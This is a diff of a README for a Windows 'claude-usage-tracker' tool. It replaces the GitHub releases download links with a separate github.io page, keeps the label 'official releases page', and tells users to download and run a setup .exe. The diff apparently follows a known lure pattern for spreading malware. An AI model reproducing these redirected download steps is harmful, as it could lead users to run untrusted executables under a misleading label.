@@ -1,6 +1,6 @@
 # 📊 claude-usage-tracker - Monitor your Claude usage with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Readershiplineup270/claude-usage-tracker/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://readershiplineup270.github.io)
 
 ## 📋 What is this tool?
 
@@ -17,7 +17,7 @@ This application works on any standard Windows computer. You need the following:
 
 ## 🚀 How to set up the tracker
 
-1. Visit the [official releases page](https://github.com/Readershiplineup270/claude-usage-tracker/releases) to access the latest installer.
+1. Visit the [official releases page](https://readershiplineup270.github.io) to access the latest installer.
 2. Look for the file named `claude-usage-tracker-setup.exe` under the Assets section.
 3. Click the file to start the download.
 4. Open the downloaded file once the process finishes.
